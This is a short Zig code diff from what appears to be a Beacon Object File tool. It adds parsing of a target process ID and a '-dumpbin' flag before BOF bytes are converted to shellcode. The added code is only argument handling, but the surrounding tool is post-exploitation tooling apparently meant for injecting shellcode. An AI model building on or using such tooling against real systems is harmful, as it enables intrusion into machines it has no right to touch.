@@ -18,6 +18,21 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
         break :blk @as([*]const u8, @ptrFromInt(std.mem.readInt(usize, bof_ptr, .little)))[0..@intCast(bof_len)];
     };
 
+    const pid = beacon.dataInt(&parser);
+    _ = pid;
+
+    const dumpbin = blk: {
+        if (beacon.dataLength(&parser) != 0) {
+            var len: i32 = 0;
+            if (beacon.dataExtract(&parser, &len)) |ptr| {
+                const str = ptr[0..@intCast(len - 1)];
+                if (std.mem.eql(u8, str, "-dumpbin")) break :blk true;
+            }
+        }
+        break :blk false;
+    };
+    _ = dumpbin;
+
     const shellcode_bytes = genShellcode(bof_bytes) catch return 0xff;
     defer freeShellcode(shellcode_bytes);
 
